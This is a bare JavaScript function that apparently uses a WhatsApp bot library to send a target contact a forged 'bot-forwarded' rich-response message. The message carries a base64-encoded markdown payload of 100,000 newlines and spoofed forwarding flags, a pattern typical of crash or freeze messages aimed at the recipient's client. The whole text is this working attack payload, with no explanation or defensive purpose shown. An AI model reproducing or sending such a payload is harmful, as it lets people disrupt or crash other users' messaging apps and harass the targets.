async function mdify(sock, jid) {
return await sock.relayMessage(jid, {
"botForwardedMessage": {
"message": {
"richResponseMessage": {
    "messageType": 1,
    "unifiedResponse": {
    "data": Buffer.from(JSON.stringify(
{
    "sections": [
        {
            "view_model": {
                "primitive": {
                    "text": `==.${"\n".repeat(100000)}.==`,
                    "__typename": "GenAIMarkdownTextUXPrimitive"
                },
                "__typename": "GenAISingleLayoutViewModel"
            }
        }
    ]
}
)).toString("base64")
                    },
    "contextInfo": {
        "isForwarded": true,
        "forwardOrigin": 4
    }
}
}}
})
}